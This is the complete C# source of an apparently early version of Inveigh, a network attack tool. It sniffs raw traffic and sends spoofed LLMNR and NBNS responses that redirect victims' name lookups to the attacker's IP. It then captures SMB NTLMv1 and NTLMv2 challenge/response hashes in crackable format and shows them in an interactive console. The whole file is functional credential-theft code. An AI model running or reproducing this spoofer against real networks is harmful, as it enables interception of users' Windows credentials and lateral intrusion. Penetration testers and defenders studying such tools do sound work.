using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using System.Collections;
using System.Collections.Concurrent;

namespace Inveigh
{

    class Program
    {
        static Hashtable smbSessionTable = Hashtable.Synchronized(new Hashtable());
        static ConcurrentQueue<string> outputQueue = new ConcurrentQueue<string>();
        static ConcurrentQueue<string> ntlmv1Queue = new ConcurrentQueue<string>();
        static ConcurrentQueue<string> ntlmv2Queue = new ConcurrentQueue<string>();

        static void Main(string[] args)
        {
            string IP = null;
            string spooferIP = null;
            string[] nbnsTypes = { "00", "20" };

            if (args.Length > 0)
            {
                foreach (var entry in args.Select((value, index) => new { index, value }))
                {
                    string argument = entry.value.ToUpper();

                    switch (argument)
                    {

                        case "-IP":
                        case "/IP":
                            IP = args[entry.index + 1];
                            break;

                        case "-NBNSTYPES":
                        case "/NBNSTYPES":
                            nbnsTypes = args[entry.index + 1].Split(',');
                            break;

                        case "-SPOOFERIP":
                        case "/SPOOFERIP":
                            spooferIP = args[entry.index + 1];
                            break;

                        case "-?":
                        case "/?":
                            Console.WriteLine("Parameters:");
                            Console.WriteLine("-IP              Primary IP address");
                            Console.WriteLine("-NBNSTypes       Array of NBNS types to spoof");
                            Console.WriteLine("-SpooferIP       IP address used in spoofed responses");
                            Environment.Exit(0);
                            break;

                    }

                }
            }

            if(string.IsNullOrEmpty(IP))
            {
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                {
                    socket.Connect("203.0.113.1", 65530); // need better way
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    IP = endPoint.Address.ToString();
                }

            }

            if (string.IsNullOrEmpty(spooferIP))
            {
                spooferIP = IP;
            }

            outputQueue.Enqueue(String.Format("[*] Inveigh started at {0}", DateTime.Now.ToString("s")));
            outputQueue.Enqueue(String.Format("[+] Primary IP Address = {0}", IP));
            outputQueue.Enqueue(String.Format("[+] Spoofer IP Address = {0}", spooferIP));
            outputQueue.Enqueue(String.Format("[+] LLMNR Spoofer = Enabled"));
            outputQueue.Enqueue(String.Format("[+] NBNS Spoofer For Types {0} = Enabled", string.Join(",",nbnsTypes)));
            outputQueue.Enqueue(String.Format("[+] SMB Capture = Enabled"));
            outputQueue.Enqueue(String.Format("[*] Press ESC to access console"));

            Thread snifferSpooferThread = new Thread(() => SnifferSpoofer(IP,spooferIP,nbnsTypes));
            snifferSpooferThread.Start();
            bool consoleOutput = true;

            while (true)
            {
                string output;

                do
                {
                    while (consoleOutput && !Console.KeyAvailable)
                    {
                        bool success = outputQueue.TryDequeue(out output);

                        if (success)
                        {

                            if (output.Contains("[*]"))
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine(output);
                                Console.ResetColor();
                            }
                            else
                            {
                                Console.WriteLine(output);
                            }

                        }

                    }
                } while (Console.ReadKey(true).Key != ConsoleKey.Escape);

                consoleOutput = false;
                int x = Console.CursorLeft;
                int y = Console.CursorTop;
                Console.CursorTop = Console.WindowTop + Console.WindowHeight - 1;
                Console.Write("Inveigh>");
                string inputCommand = Console.ReadLine();
                Console.CursorTop = Console.WindowTop + Console.WindowHeight - 2;
                Console.Write(new string(' ', Console.WindowWidth));
                Console.SetCursorPosition(x, y);
                inputCommand = inputCommand.ToUpper();

                switch (inputCommand)
                {

                    case "GET LOG":
                        Console.Clear();
                        string[] outputLog = outputQueue.ToArray();
                        foreach (string entry in outputLog)
                            Console.WriteLine(entry);
                        break;

                    case "GET NTLMV1":
                        Console.Clear();
                        string[] outputNTLMV1 = ntlmv1Queue.ToArray();
                        foreach (string entry in outputNTLMV1)
                            Console.WriteLine(entry);
                        break;

                    case "GET NTLMV2":
                        Console.Clear();
                        string[] outputNTLMV2 = ntlmv2Queue.ToArray();
                        foreach (string entry in outputNTLMV2)
                            Console.WriteLine(entry);
                        break;

                    case "?":
                    case "HELP":
                        Console.Clear();
                        Console.WriteLine("GET LOG = get Inveigh log");
                        Console.WriteLine("GET NTLMV1 = get captured NTLMv1 challenge/response hashes");
                        Console.WriteLine("GET NTLMV1 = get captured NTLMv1 challenge/response hashes");
                        Console.WriteLine("RESUME = resume real time consoule output");
                        Console.WriteLine("STOP = stop Inveigh");
                        break;

                    case "RESUME":
                        consoleOutput = true;
                        break;

                    case "STOP":
                        Environment.Exit(0);
                        break;

                    default:
                        Console.WriteLine("Invalid Command");
                        break;
                }
                
            }
        }

        static void SnifferSpoofer(string snifferIP, string spooferIP, string[] nbnsTypes)
        { 
            byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
            Socket snifferSocket;
            byte[] byteIn = new byte[4] { 1, 0, 0, 0 };
            byte[] byteOut = new byte[4] { 1, 0, 0, 0 };
            byte[] byteData = new byte[4096];
            snifferSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
            snifferSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
            snifferSocket.ReceiveBufferSize = 4096;
            IPEndPoint snifferEndPoint;

            try
            {
                snifferEndPoint = new IPEndPoint(IPAddress.Parse(snifferIP), 0);
                snifferSocket.Bind(snifferEndPoint);
            }
            catch
            {
                Console.WriteLine("error");
            }

            snifferSocket.IOControl(IOControlCode.ReceiveAll, byteIn, byteOut);
            int packetData;

            while (true)
            {

                try
                {
                    packetData = snifferSocket.Receive(byteData, 0, byteData.Length, SocketFlags.None);
                }
                catch
                {
                    packetData = 0;
                }

                if (packetData > 0)
                {
                    MemoryStream memoryStream = new MemoryStream(byteData, 0, packetData);
                    BinaryReader binaryReader = new BinaryReader(memoryStream);
                    byte versionHL = binaryReader.ReadByte();
                    binaryReader.ReadByte();
                    uint totalLength = DataToUInt16(binaryReader.ReadBytes(2));
                    binaryReader.ReadBytes(5);
                    byte protocolNumber = binaryReader.ReadByte();
                    binaryReader.ReadBytes(2);
                    byte[] sourceIP = binaryReader.ReadBytes(4);
                    IPAddress sourceIPAddress = new IPAddress(sourceIP);
                    byte[] destinationIP = binaryReader.ReadBytes(4);
                    IPAddress destinationIPAddress = new IPAddress(destinationIP);
                    byte headerLength = versionHL;
                    headerLength <<= 4;
                    headerLength >>= 4;
                    headerLength *= 4;

                    switch (protocolNumber)
                    {
                        case 6:
                            uint tcpSourcePort = DataToUInt16(binaryReader.ReadBytes(2));
                            uint tcpDestinationPort = DataToUInt16(binaryReader.ReadBytes(2));
                            binaryReader.ReadBytes(8);
                            byte tcpHeaderLength = binaryReader.ReadByte();
                            tcpHeaderLength >>= 4;
                            tcpHeaderLength *= 4;
                            binaryReader.ReadBytes(7);
                            int tcpPayloadLength = (int)totalLength - (int)headerLength - (int)tcpHeaderLength;
                            byte[] payloadBytes = binaryReader.ReadBytes(tcpPayloadLength);
                            string challenge = "";
                            string session = "";

                            switch (tcpDestinationPort)
                            {
                                case 139:
                                    break;

                                case 445:
                                    if (payloadBytes.Length > 0)
                                    {
                                        SMBConnection(payloadBytes, snifferIP, sourceIPAddress.ToString(), Convert.ToString(tcpSourcePort), "445");
                                    }

                                    session = sourceIPAddress.ToString() + ":" +Convert.ToString(tcpSourcePort);

                                    if (smbSessionTable.ContainsKey(session))
                                    {
                                        GetSMBNTLMResponse(payloadBytes, sourceIPAddress.ToString(), Convert.ToString(tcpSourcePort));
                                    }
                                    break;
                            }

                            switch (tcpSourcePort)
                            {
                                case 139:
                                    break;

                                case 445:
                                    
                                    if (payloadBytes.Length > 0)
                                    {
                                        challenge = GetSMBNTLMChallenge(payloadBytes);
                                    }

                                    session = destinationIPAddress.ToString() + ":" + Convert.ToString(tcpDestinationPort);

                                    if (challenge != "" && destinationIP != sourceIP)
                                    {
                                        smbSessionTable[session] = challenge;
                                    }
                                    break;
                            }

                            break;

                        case 17:
                            byte[] udpSourcePort = binaryReader.ReadBytes(2);
                            uint endpointSourcePort = DataToUInt16(udpSourcePort);
                            uint udpDestinationPort = DataToUInt16(binaryReader.ReadBytes(2));
                            uint udpLength = DataToUInt16(binaryReader.ReadBytes(2));
                            binaryReader.ReadBytes(2);
                            byte[] udpPayload;

                            try
                            {
                                udpPayload = binaryReader.ReadBytes(((int)udpLength - 2) * 4);
                            }
                            catch
                            {
                                udpPayload = new byte[2];
                            }

                            switch (udpDestinationPort)
                            {
                                case 137:

                                    byte[] nbnsQuestionsAnswerRRs = new byte[4];
                                    System.Buffer.BlockCopy(udpPayload, 4, nbnsQuestionsAnswerRRs, 0, 4);
                                    byte[] nbnsAdditionalRRs = new byte[2];
                                    System.Buffer.BlockCopy(udpPayload, 10, nbnsAdditionalRRs, 0, 2);

                                    if (BitConverter.ToString(nbnsQuestionsAnswerRRs) == "00-01-00-00" && BitConverter.ToString(nbnsAdditionalRRs) != "00-01")
                                    {
                                        udpLength += 12;
                                        byte[] nbnsTransactionID = new byte[2];
                                        byte[] nbnsTTL = { 0x00, 0x00, 0x00, 0xa5 };
                                        System.Buffer.BlockCopy(udpPayload, 0, nbnsTransactionID, 0, 2);
                                        byte[] nbnsRequestType = new byte[2];
                                        System.Buffer.BlockCopy(udpPayload, 43, nbnsRequestType, 0, 2);
                                        string nbnsQueryType = NBNSQueryType(nbnsRequestType);
                                        byte[] nbnsRequest = new byte[udpPayload.Length - 20];
                                        System.Buffer.BlockCopy(udpPayload, 13, nbnsRequest, 0, nbnsRequest.Length);
                                        string nbnsQueryHost = BytesToNBNSQuery(nbnsRequest);
                                        string nbnsResponseMessage = "response sent";

                                        if (Array.Exists(nbnsTypes, element => element == nbnsQueryType))
                                        {
                                            using (MemoryStream ms = new MemoryStream())
                                            {
                                                ms.Write((new byte[2] { 0x00, 0x89 }), 0, 2);
                                                ms.Write((new byte[2] { 0x00, 0x89 }), 0, 2);
                                                ms.Write(IntToByteArray2((int)udpLength), 0, 2);
                                                ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                ms.Write(nbnsTransactionID, 0, nbnsTransactionID.Length);
                                                ms.Write((new byte[11] { 0x85, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x20 }), 0, 11);
                                                ms.Write(nbnsRequest, 0, nbnsRequest.Length);
                                                ms.Write(nbnsRequestType, 0, 2);
                                                ms.Write((new byte[5] { 0x00, 0x00, 0x20, 0x00, 0x01 }), 0, 5);
                                                ms.Write(nbnsTTL, 0, 4);
                                                ms.Write((new byte[4] { 0x00, 0x06, 0x00, 0x00 }), 0, 4);
                                                ms.Write(spooferIPData, 0, spooferIPData.Length);
                                                ms.ToArray();
                                                Socket nbnsSendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
                                                nbnsSendSocket.SendBufferSize = 1024;
                                                IPEndPoint nbnsEndPoint = new IPEndPoint(sourceIPAddress, 137);
                                                nbnsSendSocket.SendTo(ms.ToArray(), nbnsEndPoint);
                                                nbnsSendSocket.Close();
                                            }
                                        }
                                        else
                                        {
                                            nbnsResponseMessage = "NBNS type disabled";
                                        }

                                        outputQueue.Enqueue(String.Format("[+] {0} NBNS request for {1}<{2}> received from {3} [{4}]", DateTime.Now.ToString("s"), nbnsQueryHost, nbnsQueryType, sourceIPAddress, nbnsResponseMessage));
                                    }
                                    break;

                                case 5353:
                                    break;

                                case 5355:

                                    byte[] llmnrType = new byte[2];
                                    System.Buffer.BlockCopy(udpPayload, (udpPayload.Length - 4), llmnrType, 0, 2);

                                    if (BitConverter.ToString(llmnrType) != "00-1C")
                                    {
                                        udpLength += (byte)(udpPayload.Length - 2);
                                        Array.Reverse(udpSourcePort);
                                        byte[] llmnrTTL = { 0x00, 0x00, 0x00, 0x1e };
                                        byte[] llmnrTransactionID = new byte[2];
                                        System.Buffer.BlockCopy(udpPayload, 0, llmnrTransactionID, 0, 2);
                                        byte[] llmnrRequest = new byte[udpPayload.Length - 18];
                                        byte[] llmnrRequestLength = new byte[1];
                                        System.Buffer.BlockCopy(udpPayload, 12, llmnrRequestLength, 0, 1);
                                        System.Buffer.BlockCopy(udpPayload, 13, llmnrRequest, 0, llmnrRequest.Length);
                                        string llmnrRequestHost = System.Text.Encoding.UTF8.GetString(llmnrRequest);
                                        string llmnrResponseMessage = "response sent";
                                        outputQueue.Enqueue(String.Format("[+] {0} LLMNR request for {1} received from {2} [{3}]", DateTime.Now.ToString("s"), llmnrRequestHost, sourceIPAddress, llmnrResponseMessage));

                                        using (MemoryStream ms = new MemoryStream())
                                        {
                                            ms.Write((new byte[2] { 0x14, 0xeb }), 0, 2);
                                            ms.Write(udpSourcePort, 0, 2);
                                            ms.Write(IntToByteArray2((int)udpLength), 0, 2);
                                            ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                            ms.Write(llmnrTransactionID, 0, llmnrTransactionID.Length);
                                            ms.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                                            ms.Write(llmnrRequestLength, 0, 1);
                                            ms.Write(llmnrRequest, 0, llmnrRequest.Length);
                                            ms.Write((new byte[5] { 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 5);
                                            ms.Write(llmnrRequestLength, 0, 1);
                                            ms.Write(llmnrRequest, 0, llmnrRequest.Length);
                                            ms.Write((new byte[5] { 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 5);
                                            ms.Write(llmnrTTL, 0, 4);
                                            ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                                            ms.Write(spooferIPData, 0, spooferIPData.Length);
                                            ms.ToArray();
                                            Socket llmnrSendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
                                            llmnrSendSocket.SendBufferSize = 1024;
                                            IPEndPoint llmnrEndPoint = new IPEndPoint(sourceIPAddress, (int)endpointSourcePort);
                                            llmnrSendSocket.SendTo(ms.ToArray(), llmnrEndPoint);
                                            llmnrSendSocket.Close();
                                        }

                                    }
                                    break;

                            }

                            break;
                    }
                }

            }

        }

        public static uint UInt16DataLength(int start, byte[] field)
        {
            byte[] fieldExtract = new byte[2];

            if (field.Length > start + 2)
            {
                System.Buffer.BlockCopy(field, start, fieldExtract, 0, 2);
            }

            return BitConverter.ToUInt16(fieldExtract, 0);
        }

        public static uint UInt32DataLength(int start, byte[] field)
        {
            byte[] fieldExtract = new byte[4];
            System.Buffer.BlockCopy(field, start, fieldExtract, 0, 4);
            return BitConverter.ToUInt32(fieldExtract, 0);
        }

        public static uint DataToUInt16(byte[] field)
        {
            Array.Reverse(field);
            return BitConverter.ToUInt16(field, 0);
        }

        public static string DataToString(int start, int length, byte[] field)
        {
            byte[] fieldExtract = new byte[length - 1];
            System.Buffer.BlockCopy(field, start, fieldExtract, 0, fieldExtract.Length);
            string payload = System.BitConverter.ToString(fieldExtract);
            payload = payload.Replace("-00", String.Empty);
            string[] payloadArray = payload.Split('-');
            string payloadConverted = "";

            foreach (string character in payloadArray)
            {
                payloadConverted += new System.String(Convert.ToChar(Convert.ToInt16(character, 16)), 1);
            }

            return payloadConverted;
        }

        public static byte[] IntToByteArray2(int field)
        {
            byte[] byteArray = BitConverter.GetBytes(field);
            Array.Reverse(byteArray);
            return byteArray.Skip(2).ToArray();
        }

        public static string BytesToNBNSQuery(byte[] field)
        {
            string nbnsUTF8 = BitConverter.ToString(field);
            nbnsUTF8 = nbnsUTF8.Replace("-00", String.Empty);
            string[] nbnsArray = nbnsUTF8.Split('-');
            string nbnsQuery = "";

            foreach (string character in nbnsArray)
            {
                nbnsQuery += new System.String(Convert.ToChar(Convert.ToInt16(character, 16)), 1);
            }

            if (nbnsQuery.Contains("CA"))
            {
                nbnsQuery = nbnsQuery.Substring(0, nbnsQuery.IndexOf("CA"));
            }

            int i = 0;
            string nbnsQuerySubtracted = "";
            do
            {
                byte nbnsQuerySub = (byte)Convert.ToChar(nbnsQuery.Substring(i, 1));
                nbnsQuerySub -= 65;
                nbnsQuerySubtracted += Convert.ToString(nbnsQuerySub, 16);
                i++;
            }
            while (i < nbnsQuery.Length);

            i = 0;
            string nbnsQueryHost = "";

            do
            {
                nbnsQueryHost += (Convert.ToChar(Convert.ToInt16(nbnsQuerySubtracted.Substring(i, 2), 16)));
                i += 2;
            }
            while (i < nbnsQuerySubtracted.Length - 1);

            return nbnsQueryHost;
        }

        public static string NBNSQueryType(byte[] field)
        {
            string nbnsQuery1 = BitConverter.ToString(field);
            string nbnsQueryType = "";

            switch (nbnsQuery1)
            {
                case "41-41":
                    nbnsQueryType = "00";
                    break;

                case "41-44":
                    nbnsQueryType = "03";
                    break;

                case "43-41":
                    nbnsQueryType = "20";
                    break;

                case "42-4C":
                    nbnsQueryType = "1B";
                    break;

                case "42-4D":
                    nbnsQueryType = "1C";
                    break;

                case "42-4E":
                    nbnsQueryType = "1D";
                    break;

                case "42-4F":
                    nbnsQueryType = "1E";
                    break;

            }

            return nbnsQueryType;
        }

        public static string GetSMBNTLMChallenge(byte[] field)
        {
            string payload = System.BitConverter.ToString(field);
            payload = payload.Replace("-", String.Empty);
            int index = payload.IndexOf("4E544C4D53535000");
            string challenge = "";

            if (index > 0 && payload.Substring((index + 16), 8) == "02000000")
            {
                challenge = payload.Substring((index + 48), 16);
                uint targetNameLength = UInt16DataLength(((index + 24) / 2), field);
                int negotiateFlags = System.Convert.ToInt16((payload.Substring((index + 44), 2)), 16);
                string negotiateFlagsValues = Convert.ToString(negotiateFlags, 2);
                string targetInfoFlag = negotiateFlagsValues.Substring(0, 1);
                string netBIOSDomainName = "";
                string dnsComputerName = "";
                string dnsDomainName = "";

                if (targetInfoFlag == "1")
                {
                    int targetInfoIndex = ((index + 80) / 2) + (int)targetNameLength + 16;
                    byte targetInfoItemType = field[targetInfoIndex];
                    int i = 0;

                    while (targetInfoItemType != 0 && i < 10)
                    {
                        uint targetInfoItemLength = UInt16DataLength((targetInfoIndex + 2), field);

                        switch (targetInfoItemType)
                        {
                            case 2:
                                netBIOSDomainName = DataToString((targetInfoIndex + 4), (int)targetInfoItemLength, field);
                                break;

                            case 3:
                                dnsComputerName = DataToString((targetInfoIndex + 4), (int)targetInfoItemLength, field);
                                break;

                            case 4:
                                dnsDomainName = DataToString((targetInfoIndex + 4), (int)targetInfoItemLength, field);
                                break;
                        }

                        targetInfoIndex += (int)targetInfoItemLength + 4;
                        targetInfoItemType = field[targetInfoIndex];
                        i++;
                    }

                }

            }

            return challenge;
        }

        public static string GetSMBNTLMResponse(byte[] field, string sourceIP, string sourcePort)
        {
            string payload = System.BitConverter.ToString(field);
            payload = payload.Replace("-", String.Empty);
            string session = sourceIP + ":" + sourcePort;
            int index = payload.IndexOf("4E544C4D53535000");
            string lmResponse = "";
            string ntlmResponse = "";
            int ntlmLength = 0;
            string challenge = "";
            string domain = "";
            string user = "";
            string host = "";

            if (index > 0 && payload.Substring((index + 16), 8) == "03000000")
            {
                int ntlmsspOffset = index / 2;
                int lmLength = (int)UInt16DataLength((ntlmsspOffset + 12), field);
                int lmOffset = (int)UInt32DataLength((ntlmsspOffset + 16), field);
                byte[] lmPayload = new byte[lmLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + lmOffset), lmPayload, 0, lmPayload.Length);
                lmResponse = System.BitConverter.ToString(lmPayload).Replace("-", String.Empty);
                ntlmLength = (int)UInt16DataLength((ntlmsspOffset + 20), field);
                int ntlmOffset = (int)UInt32DataLength((ntlmsspOffset + 24), field);
                byte[] ntlmPayload = new byte[ntlmLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + ntlmOffset), ntlmPayload, 0, ntlmPayload.Length);
                ntlmResponse = System.BitConverter.ToString(ntlmPayload).Replace("-", String.Empty);
                int domainLength = (int)UInt16DataLength((ntlmsspOffset + 28), field);
                int domainOffset = (int)UInt32DataLength((ntlmsspOffset + 32), field);
                byte[] domainPayload = new byte[domainLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + domainOffset), domainPayload, 0, domainPayload.Length);
                domain = DataToString((ntlmsspOffset + domainOffset), domainLength, field);
                int userLength = (int)UInt16DataLength((ntlmsspOffset + 36), field);
                int userOffset = (int)UInt32DataLength((ntlmsspOffset + 40), field);
                byte[] userPayload = new byte[userLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + userOffset), userPayload, 0, userPayload.Length);
                user = DataToString((ntlmsspOffset + userOffset), userLength, field);
                int hostLength = (int)UInt16DataLength((ntlmsspOffset + 44), field);
                int hostOffset = (int)UInt32DataLength((ntlmsspOffset + 48), field);
                byte[] hostPayload = new byte[hostLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + hostOffset), hostPayload, 0, hostPayload.Length);
                host = DataToString((ntlmsspOffset + hostOffset), hostLength, field);
                challenge = smbSessionTable[session].ToString();

                if (ntlmLength > 24)
                {
                    string ntlmV2Hash = user + "::" + domain + ":" + challenge + ":" + ntlmResponse.Insert(32, ":");
                    outputQueue.Enqueue(String.Format("[+] {0} SMB NTLMv2 challenge/response captured from {1}({2}):{3}{4}", DateTime.Now.ToString("s"), sourceIP, host, System.Environment.NewLine, ntlmV2Hash));
                    ntlmv2Queue.Enqueue(ntlmV2Hash);
                }
                else if (ntlmLength == 24)
                {
                    string ntlmV1Hash = user + "::" + domain + ":" + lmResponse + ":" + ntlmResponse + ":" + challenge;
                    outputQueue.Enqueue(String.Format("[+] {0} SMB NTLMv1 challenge/response captured from {1}({2}):{3}{4}", DateTime.Now.ToString("s"), sourceIP, host, System.Environment.NewLine, ntlmV1Hash));
                    ntlmv1Queue.Enqueue(ntlmV1Hash);
                }

            }

            return ntlmResponse;
        }

        public static void SMBConnection(byte[] field, string IP, string sourceIP, string sourcePort, string port)
        {
            string payload = System.BitConverter.ToString(field);
            payload = payload.Replace("-", String.Empty);
            string session = sourceIP + ":" + sourcePort;
            int index = payload.IndexOf("FF534D42");

            if(!smbSessionTable.ContainsKey(session) && index > 0 && payload.Substring((index + 8),2) == "72" && IP != sourceIP)
            {
                outputQueue.Enqueue(String.Format("[+] {0} SMB({1}) negotiation request detected from {2}", DateTime.Now.ToString("s"), port, session));
            }

            if(!smbSessionTable.ContainsKey(session) && index > 0)
            {
                smbSessionTable.Add(session, "");
            }

            index = payload.IndexOf("FE534D42");

            if (!smbSessionTable.ContainsKey(session) && index > 0 && payload.Substring((index + 24), 4) == "0000" && IP != sourceIP)
            {
                outputQueue.Enqueue(String.Format("[+] {0} SMB({1}) negotiation request detected from {2}", DateTime.Now.ToString("s"), port, session));
            }

            if (!smbSessionTable.ContainsKey(session) && index > 0)
            {
                smbSessionTable.Add(session, "");
            }

        }

    }

}

